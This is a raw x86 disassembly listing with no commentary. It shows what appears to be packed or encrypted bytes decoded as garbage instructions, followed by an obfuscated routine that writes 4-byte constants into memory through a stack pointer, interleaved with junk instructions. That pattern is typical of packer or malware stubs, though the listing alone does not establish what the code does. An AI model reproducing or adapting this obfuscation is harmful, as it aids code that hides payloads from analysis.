  40159d:	d8 22                	fsubs  (%edx)
  40159f:	ad                   	lods   %ds:(%esi),%eax
  4015a0:	d9 16                	fsts   (%esi)
  4015a2:	47                   	inc    %edi
  4015a3:	5f                   	pop    %edi
  4015a4:	1c 7d                	sbb    $0x7d,%al
  4015a6:	0c 8b                	or     $0x8b,%al
  4015a8:	03 bc b1 01 e2 56 a5 	add    -0x5aa91dff(%ecx,%esi,4),%edi
  4015af:	6c                   	insb   (%dx),%es:(%edi)
  4015b0:	78 41                	js     0x4015f3
  4015b2:	61                   	popa
  4015b3:	21 5d d0             	and    %ebx,-0x30(%ebp)
  4015b6:	5f                   	pop    %edi
  4015b7:	16                   	push   %ss
  4015b8:	20 1e                	and    %bl,(%esi)
  4015ba:	92                   	xchg   %eax,%edx
  4015bb:	7e 31                	jle    0x4015ee
  4015bd:	95                   	xchg   %eax,%ebp
  4015be:	fb                   	sti
  4015bf:	ca cb 44             	lret   $0x44cb
  4015c2:	06                   	push   %es
  4015c3:	19 26                	sbb    %esp,(%esi)
  4015c5:	d8 0c 73             	fmuls  (%ebx,%esi,2)
  4015c8:	4f                   	dec    %edi
  4015c9:	7e f2                	jle    0x4015bd
  4015cb:	bd 50 a6 37 1d       	mov    $0x1d37a650,%ebp
  4015d0:	ce                   	into
  4015d1:	66 80 25 8d dc 09 8f 	data16 andb $0x1f,0x8f09dc8d
  4015d8:	1f 
  4015d9:	1b f2                	sbb    %edx,%esi
  4015db:	7a e0                	jp     0x4015bd
  4015dd:	87 26                	xchg   %esp,(%esi)
  4015df:	c6                   	(bad)
  4015e0:	b7 37                	mov    $0x37,%bh
  4015e2:	07                   	pop    %es
  4015e3:	63 b9 9c 8e 01 33    	arpl   %edi,0x33018e9c(%ecx)
  4015e9:	de 10                	ficoms (%eax)
  4015eb:	6b aa aa 44 c8 e3 25 	imul   $0x25,-0x1c37bb56(%edx),%ebp
  4015f2:	e8 33 b5 26 fb       	call   0xfb66cb2a
  4015f7:	f3 40                	repz inc %eax
  4015f9:	68 d6 75 fb d0       	push   $0xd0fb75d6
  4015fe:	9c                   	pushf
  4015ff:	b4 20                	mov    $0x20,%ah
  401601:	6d                   	insl   (%dx),%es:(%edi)
  401602:	a3 32 73 bd 01       	mov    %eax,0x1bd7332
  401607:	a9 ec 57 82 56       	test   $0x568257ec,%eax
  40160c:	85 87 a8 08 bf 31    	test   %eax,0x31bf08a8(%edi)
  401612:	ce                   	into
  401613:	fd                   	std
  401614:	9c                   	pushf
  401615:	21 48 e6             	and    %ecx,-0x1a(%eax)
  401618:	61                   	popa
  401619:	6c                   	insb   (%dx),%es:(%edi)
  40161a:	9b                   	fwait
  40161b:	56                   	push   %esi
  40161c:	bf 37 89 3f c3       	mov    $0xc33f8937,%edi
  401621:	85 b8 d3 42 91 50    	test   %edi,0x509142d3(%eax)
  401627:	59                   	pop    %ecx
  401628:	94                   	xchg   %eax,%esp
  401629:	32 c9                	xor    %cl,%cl
  40162b:	63 be 25 b9 c4 bb    	arpl   %edi,-0x443b46db(%esi)
  401631:	c1 aa 8a da 2f b4 77 	shrl   $0x77,-0x4bd02576(%edx)
  401638:	4c                   	dec    %esp
  401639:	6a f6                	push   $0xfffffff6
  40163b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40163c:	4d                   	dec    %ebp
  40163d:	2e 22 ab f2 98 85 b0 	and    %cs:-0x4f7a670e(%ebx),%ch
  401644:	8f                   	(bad)
  401645:	e1 13                	loope  0x40165a
  401647:	2c 67                	sub    $0x67,%al
  401649:	d1 4f 3c             	rorl   $1,0x3c(%edi)
  40164c:	51                   	push   %ecx
  40164d:	4c                   	dec    %esp
  40164e:	02 10                	add    (%eax),%dl
  401650:	bc 31 21 1e 35       	mov    $0x351e2131,%esp
  401655:	d2 c5                	rol    %cl,%ch
  401657:	53                   	push   %ebx
  401658:	af                   	scas   %es:(%edi),%eax
  401659:	c6                   	(bad)
  40165a:	92                   	xchg   %eax,%edx
  40165b:	da 25 f0 d9 6e 77    	fisubl 0x776ed9f0
  401661:	73 e5                	jae    0x401648
  401663:	c7                   	(bad)
  401664:	60                   	pusha
  401665:	de d6                	(bad)
  401667:	26 b6 dc             	es mov $0xdc,%dh
  40166a:	f1                   	int1
  40166b:	8c 55 1d             	mov    %ss,0x1d(%ebp)
  40166e:	6b 2a a3             	imul   $0xffffffa3,(%edx),%ebp
  401671:	f8                   	clc
  401672:	7f 7b                	jg     0x4016ef
  401674:	b0 da                	mov    $0xda,%al
  401676:	62 df 00             	(bad) {%k3}{z}
  401679:	c3                   	ret
  40167a:	dc 5b 66             	fcompl 0x66(%ebx)
  40167d:	7a 0b                	jp     0x40168a
  40167f:	3c ba                	cmp    $0xba,%al
  401681:	36 af                	ss scas %es:(%edi),%eax
  401683:	9d                   	popf
  401684:	1d 6c ed 6f a3       	sbb    $0xa36fed6c,%eax
  401689:	5e                   	pop    %esi
  40168a:	5f                   	pop    %edi
  40168b:	c3                   	ret
  40168c:	52                   	push   %edx
  40168d:	e4 af                	in     $0xaf,%al
  40168f:	7a eb                	jp     0x40167c
  401691:	4f                   	dec    %edi
  401692:	e6 ad                	out    %al,$0xad
  401694:	3e c7                	ds (bad)
  401696:	16                   	push   %ss
  401697:	21 b5 f0 df e6 92    	and    %esi,-0x6d192010(%ebp)
  40169d:	a2 2a 6d 01 85       	mov    %al,0x85016d2a
  4016a2:	28 71 fb             	sub    %dh,-0x5(%ecx)
  4016a5:	78 34                	js     0x4016db
  4016a7:	a8 f0                	test   $0xf0,%al
  4016a9:	2b 4f 40             	sub    0x40(%edi),%ecx
  4016ac:	64 83 c4 e8          	fs add $0xffffffe8,%esp
  4016b0:	fc                   	cld
  4016b1:	72 7b                	jb     0x40172e
  4016b3:	05 40 6e 1a 65       	add    $0x651a6e40,%eax
  4016b8:	9c                   	pushf
  4016b9:	42                   	inc    %edx
  4016ba:	15 eb 7f 09 2e       	adc    $0x2e097feb,%eax
  4016bf:	e8 f1 bc 7a 41       	call   0x41bad3b5
  4016c4:	c0 c6 d3             	rol    $0xd3,%dh
  4016c7:	1d 40 59 4f 33       	sbb    $0x334f5940,%eax
  4016cc:	12 19                	adc    (%ecx),%bl
  4016ce:	1b 07                	sbb    (%edi),%eax
  4016d0:	3a 2a                	cmp    (%edx),%ch
  4016d2:	c5 c3 b4             	(bad)
  4016d5:	d4 d2                	aam    $0xd2
  4016d7:	7c f7                	jl     0x4016d0
  4016d9:	bc f6 66 16 65       	mov    $0x651666f6,%esp
  4016de:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4016df:	a3 db 47 72 ab       	mov    %eax,0xab7247db
  4016e4:	44                   	inc    %esp
  4016e5:	f9                   	stc
  4016e6:	f8                   	clc
  4016e7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4016e8:	4f                   	dec    %edi
  4016e9:	27                   	daa
  4016ea:	f1                   	int1
  4016eb:	d2 ba da 57 88 84    	sarb   %cl,-0x7b77a826(%edx)
  4016f1:	cb                   	lret
  4016f2:	a0 fe a4 26 0f       	mov    0xf26a4fe,%al
  4016f7:	73 bd                	jae    0x4016b6
  4016f9:	de c9                	fmulp  %st,%st(1)
  4016fb:	0b a8 8b 75 d4 74    	or     0x74d4758b(%eax),%ebp
  401701:	af                   	scas   %es:(%edi),%eax
  401702:	ff 22                	jmp    *(%edx)
  401704:	51                   	push   %ecx
  401705:	e5 1c                	in     $0x1c,%eax
  401707:	80 d3 35             	adc    $0x35,%bl
  40170a:	16                   	push   %ss
  40170b:	85 73 c8             	test   %esi,-0x38(%ebx)
  40170e:	8e 02                	mov    (%edx),%es
  401710:	ef                   	out    %eax,(%dx)
  401711:	9b                   	fwait
  401712:	07                   	pop    %es
  401713:	04 10                	add    $0x10,%al
  401715:	23 44 69 fd          	and    -0x3(%ecx,%ebp,2),%eax
  401719:	60                   	pusha
  40171a:	68 00 48 da ed       	push   $0xedda4800
  40171f:	76 17                	jbe    0x401738
  401721:	01 a6 2f 61 81 6f    	add    %esp,0x6f81612f(%esi)
  401727:	f8                   	clc
  401728:	60                   	pusha
  401729:	6f                   	outsl  %ds:(%esi),(%dx)
  40172a:	9d                   	popf
  40172b:	ed                   	in     (%dx),%eax
  40172c:	6e                   	outsb  %ds:(%esi),(%dx)
  40172d:	93                   	xchg   %eax,%ebx
  40172e:	03 cf                	add    %edi,%ecx
  401730:	05 e5 d3 2d 18       	add    $0x182dd3e5,%eax
  401735:	ec                   	in     (%dx),%al
  401736:	43                   	inc    %ebx
  401737:	1b 30                	sbb    (%eax),%esi
  401739:	75 18                	jne    0x401753
  40173b:	b4 a1                	mov    $0xa1,%ah
  40173d:	58                   	pop    %eax
  40173e:	91                   	xchg   %eax,%ecx
  40173f:	75 a5                	jne    0x4016e6
  401741:	28 da                	sub    %bl,%dl
  401743:	0f 08                	invd
  401745:	98                   	cwtl
  401746:	29 36                	sub    %esi,(%esi)
  401748:	f2 a7                	repnz cmpsl %es:(%edi),%ds:(%esi)
  40174a:	af                   	scas   %es:(%edi),%eax
  40174b:	6c                   	insb   (%dx),%es:(%edi)
  40174c:	81 1a 14 28 09 bf    	sbbl   $0xbf092814,(%edx)
  401752:	41                   	inc    %ecx
  401753:	06                   	push   %es
  401754:	37                   	aaa
  401755:	cd 98                	int    $0x98
  401757:	88 ff                	mov    %bh,%bh
  401759:	9e                   	sahf
  40175a:	23 dd                	and    %ebp,%ebx
  40175c:	8d af fe dc 40 00    	lea    0x40dcfe(%edi),%ebp
  401762:	c7 44 24 e0 59 f4 40 	movl   $0x40f459,-0x20(%esp)
  401769:	00 
  40176a:	23 dd                	and    %ebp,%ebx
  40176c:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401770:	81 03 8d 89 6d ff    	addl   $0xff6d898d,(%ebx)
  401776:	8d af fe dc 40 00    	lea    0x40dcfe(%edi),%ebp
  40177c:	33 db                	xor    %ebx,%ebx
  40177e:	b3 04                	mov    $0x4,%bl
  401780:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401784:	66 8b ea             	mov    %dx,%bp
  401787:	8d 86 e9 fd 40 00    	lea    0x40fde9(%esi),%eax
  40178d:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401791:	c7 01 40 00 c7 44    	movl   $0x44c70040,(%ecx)
  401797:	8d 86 e9 fd 40 00    	lea    0x40fde9(%esi),%eax
  40179d:	33 c0                	xor    %eax,%eax
  40179f:	b0 04                	mov    $0x4,%al
  4017a1:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4017a5:	0b f1                	or     %ecx,%esi
  4017a7:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4017ab:	81 00 24 e0 59 c4    	addl   $0xc459e024,(%eax)
  4017b1:	83 c0 02             	add    $0x2,%eax
  4017b4:	66 0b ce             	or     %si,%cx
  4017b7:	33 db                	xor    %ebx,%ebx
  4017b9:	b3 04                	mov    $0x4,%bl
  4017bb:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4017bf:	66 0b ce             	or     %si,%cx
  4017c2:	0f b6 d1             	movzbl %cl,%edx
  4017c5:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4017c9:	81 01 40 00 8d 89    	addl   $0x898d0040,(%ecx)
  4017cf:	0f b6 d1             	movzbl %cl,%edx
  4017d2:	8d b2 7b f9 40 00    	lea    0x40f97b(%edx),%esi
  4017d8:	33 db                	xor    %ebx,%ebx
  4017da:	b3 04                	mov    $0x4,%bl
  4017dc:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4017e0:	8d b2 7b f9 40 00    	lea    0x40f97b(%edx),%esi
  4017e6:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4017ea:	b8 6d ff 40 00       	mov    $0x40ff6d,%eax
  4017ef:	ab                   	stos   %eax,%es:(%edi)
  4017f0:	03 d9                	add    %ecx,%ebx
  4017f2:	33 c9                	xor    %ecx,%ecx
  4017f4:	b1 04                	mov    $0x4,%cl
  4017f6:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4017fa:	66 85 dd             	test   %bx,%bp
  4017fd:	66 2b ca             	sub    %dx,%cx
  401800:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401804:	81 03 8b 44 24 e0    	addl   $0xe024448b,(%ebx)
  40180a:	66 2b ca             	sub    %dx,%cx
  40180d:	8d 68 02             	lea    0x2(%eax),%ebp
  401810:	0b d7                	or     %edi,%edx
  401812:	33 db                	xor    %ebx,%ebx
  401814:	b3 04                	mov    $0x4,%bl
  401816:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40181a:	8d 68 02             	lea    0x2(%eax),%ebp
  40181d:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401821:	81 08 81 00 d8 e4    	orl    $0xe4d80081,(%eax)
  401827:	0b d7                	or     %edi,%edx
  401829:	8b d3                	mov    %ebx,%edx
  40182b:	33 c9                	xor    %ecx,%ecx
  40182d:	b1 04                	mov    $0x4,%cl
  40182f:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401833:	8b d3                	mov    %ebx,%edx
  401835:	66 33 f7             	xor    %di,%si
  401838:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  40183c:	c7 03 6c b5 81 30    	movl   $0x3081b56c,(%ebx)
  401842:	66 33 f7             	xor    %di,%si
  401845:	66 23 ee             	and    %si,%bp
  401848:	0f b6 d3             	movzbl %bl,%edx
  40184b:	33 db                	xor    %ebx,%ebx
  40184d:	b3 04                	mov    $0x4,%bl
  40184f:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401853:	66 23 ee             	and    %si,%bp
  401856:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  40185a:	c7 03 48 5a 7c f5    	movl   $0xf57c5a48,(%ebx)
  401860:	0f b6 d3             	movzbl %bl,%edx
  401863:	33 c9                	xor    %ecx,%ecx
  401865:	b1 04                	mov    $0x4,%cl
  401867:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40186b:	81 e5 6a d9 40 00    	and    $0x40d96a,%ebp
  401871:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401875:	c7 02 b8 eb fc 40    	movl   $0x40fcebb8,(%edx)
  40187b:	66 03 ed             	add    %bp,%bp
  40187e:	8d 86 e9 fd 40 00    	lea    0x40fde9(%esi),%eax
  401884:	33 c0                	xor    %eax,%eax
  401886:	b0 04                	mov    $0x4,%al
  401888:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40188c:	8d 86 e9 fd 40 00    	lea    0x40fde9(%esi),%eax
  401892:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401896:	81 08 00 33 c0 b0    	orl    $0xb0c03300,(%eax)
  40189c:	66 8b f0             	mov    %ax,%si
  40189f:	0f be c8             	movsbl %al,%ecx
  4018a2:	33 c0                	xor    %eax,%eax
  4018a4:	b0 04                	mov    $0x4,%al
  4018a6:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4018aa:	0f be c8             	movsbl %al,%ecx
  4018ad:	81 f2 eb fc 40 00    	xor    $0x40fceb,%edx
  4018b3:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4018b7:	81 00 04 01 44 24    	addl   $0x24440104,(%eax)
  4018bd:	81 f2 eb fc 40 00    	xor    $0x40fceb,%edx
  4018c3:	33 df                	xor    %edi,%ebx
  4018c5:	33 c0                	xor    %eax,%eax
  4018c7:	b0 04                	mov    $0x4,%al
  4018c9:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4018cd:	33 df                	xor    %edi,%ebx
  4018cf:	66 03 c3             	add    %bx,%ax
  4018d2:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4018d6:	c7 00 e0 8d ba 79    	movl   $0x79ba8de0,(%eax)
  4018dc:	66 03 c3             	add    %bx,%ax
  4018df:	66 85 c3             	test   %ax,%bx
  4018e2:	33 c9                	xor    %ecx,%ecx
  4018e4:	b1 04                	mov    $0x4,%cl
  4018e6:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4018ea:	66 85 c3             	test   %ax,%bx
  4018ed:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4018f1:	81 00 f9 40 00 8b    	addl   $0x8b0040f9,(%eax)
  4018f7:	c1 fd 02             	sar    $0x2,%ebp
  4018fa:	66 85 ee             	test   %bp,%si
  4018fd:	33 c9                	xor    %ecx,%ecx
  4018ff:	b1 04                	mov    $0x4,%cl
  401901:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401905:	66 85 ee             	test   %bp,%si
  401908:	0b eb                	or     %ebx,%ebp
  40190a:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40190e:	b8 4c 24 e0 81       	mov    $0x81e0244c,%eax
  401913:	ab                   	stos   %eax,%es:(%edi)
  401914:	0b eb                	or     %ebx,%ebp
  401916:	33 c9                	xor    %ecx,%ecx
  401918:	b1 04                	mov    $0x4,%cl
  40191a:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40191e:	0f be dd             	movsbl %ch,%ebx
  401921:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401925:	81 02 01 40 00 bf    	addl   $0xbf004001,(%edx)
  40192b:	c1 fe 02             	sar    $0x2,%esi
  40192e:	03 ca                	add    %edx,%ecx
  401930:	33 d2                	xor    %edx,%edx
  401932:	b2 04                	mov    $0x4,%dl
  401934:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401938:	03 ca                	add    %edx,%ecx
  40193a:	66 8b f1             	mov    %cx,%si
  40193d:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401941:	81 03 10 f7 eb 66    	addl   $0x66ebf710,(%ebx)
  401947:	66 8b f1             	mov    %cx,%si
  40194a:	33 db                	xor    %ebx,%ebx
  40194c:	b3 04                	mov    $0x4,%bl
  40194e:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401952:	8d 50 02             	lea    0x2(%eax),%edx
  401955:	8b d5                	mov    %ebp,%edx
  401957:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40195b:	b8 23 f7 33 db       	mov    $0xdb33f723,%eax
  401960:	ab                   	stos   %eax,%es:(%edi)
  401961:	8b d5                	mov    %ebp,%edx
  401963:	0b f2                	or     %edx,%esi
  401965:	c1 ce 02             	ror    $0x2,%esi
  401968:	23 c7                	and    %edi,%eax
  40196a:	33 c9                	xor    %ecx,%ecx
  40196c:	b1 04                	mov    $0x4,%cl
  40196e:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401972:	0b f2                	or     %edx,%esi
  401974:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401978:	81 03 b3 04 01 5c    	addl   $0x5c0104b3,(%ebx)
  40197e:	c1 ce 02             	ror    $0x2,%esi
  401981:	23 c7                	and    %edi,%eax
  401983:	66 0b ea             	or     %dx,%bp
  401986:	33 d2                	xor    %edx,%edx
  401988:	b2 04                	mov    $0x4,%dl
  40198a:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40198e:	23 c7                	and    %edi,%eax
  401990:	66 0b ea             	or     %dx,%bp
  401993:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401997:	81 03 24 e0 66 23    	addl   $0x2366e024,(%ebx)
  40199d:	66 0b ea             	or     %dx,%bp
  4019a0:	33 d2                	xor    %edx,%edx
  4019a2:	b2 04                	mov    $0x4,%dl
  4019a4:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4019a8:	0f be d9             	movsbl %cl,%ebx
  4019ab:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4019af:	b8 f7 8b 5c 24       	mov    $0x245c8bf7,%eax
  4019b4:	ab                   	stos   %eax,%es:(%edi)
  4019b5:	03 e8                	add    %eax,%ebp
  4019b7:	33 d2                	xor    %edx,%edx
  4019b9:	b2 04                	mov    $0x4,%dl
  4019bb:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4019bf:	66 8b e8             	mov    %ax,%bp
  4019c2:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4019c6:	81 03 e0 81 03 0b    	addl   $0xb0381e0,(%ebx)
  4019cc:	0f b6 c9             	movzbl %cl,%ecx
  4019cf:	33 db                	xor    %ebx,%ebx
  4019d1:	b3 04                	mov    $0x4,%bl
  4019d3:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4019d7:	66 23 da             	and    %dx,%bx
  4019da:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4019de:	81 00 80 0d 1e 81    	addl   $0x811e0d80,(%eax)
  4019e4:	66 33 d6             	xor    %si,%dx
  4019e7:	0f c1 c0             	xadd   %eax,%eax
  4019ea:	66 0b c9             	or     %cx,%cx
  4019ed:	33 d2                	xor    %edx,%edx
  4019ef:	b2 04                	mov    $0x4,%dl
  4019f1:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4019f5:	0f c1 c0             	xadd   %eax,%eax
  4019f8:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4019fc:	81 00 33 5b c0 0d    	addl   $0xdc05b33,(%eax)
  401a02:	66 0b c9             	or     %cx,%cx
  401a05:	23 cd                	and    %ebp,%ecx
  401a07:	c1 d5 02             	rcl    $0x2,%ebp
  401a0a:	33 c9                	xor    %ecx,%ecx
  401a0c:	b1 04                	mov    $0x4,%cl
  401a0e:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401a12:	23 cd                	and    %ebp,%ecx
  401a14:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401a18:	c7 03 a7 f7 d1 f7    	movl   $0xf7d1f7a7,(%ebx)
  401a1e:	c1 d5 02             	rcl    $0x2,%ebp
  401a21:	33 db                	xor    %ebx,%ebx
  401a23:	b3 04                	mov    $0x4,%bl
  401a25:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401a29:	8b d3                	mov    %ebx,%edx
  401a2b:	66 85 c0             	test   %ax,%ax
  401a2e:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401a32:	81 03 d5 33 c9 b1    	addl   $0xb1c933d5,(%ebx)
  401a38:	66 85 c0             	test   %ax,%ax
  401a3b:	33 d6                	xor    %esi,%edx
  401a3d:	66 0b e8             	or     %ax,%bp
  401a40:	33 db                	xor    %ebx,%ebx
  401a42:	b3 04                	mov    $0x4,%bl
  401a44:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401a48:	33 d6                	xor    %esi,%edx
  401a4a:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401a4e:	81 08 04 01 4c 24    	orl    $0x244c0104,(%eax)
  401a54:	66 0b e8             	or     %ax,%bp
  401a57:	33 c9                	xor    %ecx,%ecx
  401a59:	b1 04                	mov    $0x4,%cl
  401a5b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401a5f:	0b cd                	or     %ebp,%ecx
  401a61:	2b d1                	sub    %ecx,%edx
  401a63:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401a67:	b8 e0 f7 d5 8b       	mov    $0x8bd5f7e0,%eax
  401a6c:	ab                   	stos   %eax,%es:(%edi)
  401a6d:	2b d1                	sub    %ecx,%edx
  401a6f:	33 c5                	xor    %ebp,%eax
  401a71:	66 2b f1             	sub    %cx,%si
  401a74:	66 33 dd             	xor    %bp,%bx
  401a77:	33 db                	xor    %ebx,%ebx
  401a79:	b3 04                	mov    $0x4,%bl
  401a7b:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401a7f:	33 c5                	xor    %ebp,%eax
  401a81:	66 2b f1             	sub    %cx,%si
  401a84:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401a88:	81 01 44 24 e0 81    	addl   $0x81e02444,(%ecx)
  401a8e:	66 2b f1             	sub    %cx,%si
  401a91:	66 33 dd             	xor    %bp,%bx
  401a94:	85 fe                	test   %edi,%esi
  401a96:	33 db                	xor    %ebx,%ebx
  401a98:	b3 04                	mov    $0x4,%bl
  401a9a:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401a9e:	66 33 dd             	xor    %bp,%bx
  401aa1:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401aa5:	81 03 00 e8 03 00    	addl   $0x3e800,(%ebx)
  401aab:	85 fe                	test   %edi,%esi
  401aad:	66 0b eb             	or     %bx,%bp
  401ab0:	33 db                	xor    %ebx,%ebx
  401ab2:	b3 04                	mov    $0x4,%bl
  401ab4:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401ab8:	66 0b eb             	or     %bx,%bp
  401abb:	0b dd                	or     %ebp,%ebx
  401abd:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401ac1:	c7 00 00 66 33 ee    	movl   $0xee336600,(%eax)
  401ac7:	0b dd                	or     %ebp,%ebx
  401ac9:	66 23 ce             	and    %si,%cx
  401acc:	33 da                	xor    %edx,%ebx
  401ace:	33 db                	xor    %ebx,%ebx
  401ad0:	b3 04                	mov    $0x4,%bl
  401ad2:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401ad6:	66 23 ce             	and    %si,%cx
  401ad9:	33 da                	xor    %edx,%ebx
  401adb:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401adf:	81 01 8d ba 79 f9    	addl   $0xf979ba8d,(%ecx)
  401ae5:	33 da                	xor    %edx,%ebx
  401ae7:	8d 50 02             	lea    0x2(%eax),%edx
  401aea:	66 85 cf             	test   %cx,%di
  401aed:	33 c9                	xor    %ecx,%ecx
  401aef:	b1 04                	mov    $0x4,%cl
  401af1:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401af5:	8d 50 02             	lea    0x2(%eax),%edx
  401af8:	66 85 cf             	test   %cx,%di
  401afb:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401aff:	c7 01 40 00 33 c9    	movl   $0xc9330040,(%ecx)
  401b05:	66 85 cf             	test   %cx,%di
  401b08:	0f be df             	movsbl %bh,%ebx
  401b0b:	33 c0                	xor    %eax,%eax
  401b0d:	b0 04                	mov    $0x4,%al
  401b0f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401b13:	0f be df             	movsbl %bh,%ebx
  401b16:	85 ee                	test   %ebp,%esi
  401b18:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401b1c:	81 03 b1 04 01 4c    	addl   $0x4c0104b1,(%ebx)
  401b22:	85 ee                	test   %ebp,%esi
  401b24:	83 ee 02             	sub    $0x2,%esi
  401b27:	33 c0                	xor    %eax,%eax
  401b29:	b0 04                	mov    $0x4,%al
  401b2b:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401b2f:	83 ee 02             	sub    $0x2,%esi
  401b32:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401b36:	c7 03 24 e0 8d ba    	movl   $0xba8de024,(%ebx)
  401b3c:	66 03 ff             	add    %di,%di
  401b3f:	33 c9                	xor    %ecx,%ecx
  401b41:	b1 04                	mov    $0x4,%cl
  401b43:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401b47:	66 85 c9             	test   %cx,%cx
  401b4a:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401b4e:	c7 03 79 f9 40 00    	movl   $0x40f979,(%ebx)
  401b54:	66 8b f7             	mov    %di,%si
  401b57:	97                   	xchg   %eax,%edi
  401b58:	8d b6 68 d8 40 00    	lea    0x40d868(%esi),%esi
  401b5e:	33 c9                	xor    %ecx,%ecx
  401b60:	b1 04                	mov    $0x4,%cl
  401b62:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401b66:	97                   	xchg   %eax,%edi
  401b67:	8d b6 68 d8 40 00    	lea    0x40d868(%esi),%esi
  401b6d:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401b71:	81 03 8b 4c 24 e0    	addl   $0xe0244c8b,(%ebx)
  401b77:	8d b6 68 d8 40 00    	lea    0x40d868(%esi),%esi
  401b7d:	33 c9                	xor    %ecx,%ecx
  401b7f:	b1 04                	mov    $0x4,%cl
  401b81:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401b85:	23 d2                	and    %edx,%edx
  401b87:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401b8b:	b8 81 01 f3 a4       	mov    $0xa4f30181,%eax
  401b90:	ab                   	stos   %eax,%es:(%edi)
  401b91:	0f be c5             	movsbl %ch,%eax
  401b94:	33 db                	xor    %ebx,%ebx
  401b96:	b3 04                	mov    $0x4,%bl
  401b98:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401b9c:	f7 e7                	mul    %edi
  401b9e:	66 2b d1             	sub    %cx,%dx
  401ba1:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401ba5:	c7 03 bf 10 66 23    	movl   $0x236610bf,(%ebx)
  401bab:	66 2b d1             	sub    %cx,%dx
  401bae:	33 d2                	xor    %edx,%edx
  401bb0:	b2 04                	mov    $0x4,%dl
  401bb2:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401bb6:	8b f5                	mov    %ebp,%esi
  401bb8:	03 f6                	add    %esi,%esi
  401bba:	66 0b de             	or     %si,%bx
  401bbd:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401bc1:	b8 c5 33 c9 b1       	mov    $0xb1c933c5,%eax
  401bc6:	ab                   	stos   %eax,%es:(%edi)
  401bc7:	03 f6                	add    %esi,%esi
  401bc9:	33 c0                	xor    %eax,%eax
  401bcb:	b0 04                	mov    $0x4,%al
  401bcd:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401bd1:	66 0b de             	or     %si,%bx
  401bd4:	96                   	xchg   %eax,%esi
  401bd5:	2b c6                	sub    %esi,%eax
  401bd7:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401bdb:	81 0b 04 01 4c 24    	orl    $0x244c0104,(%ebx)
  401be1:	96                   	xchg   %eax,%esi
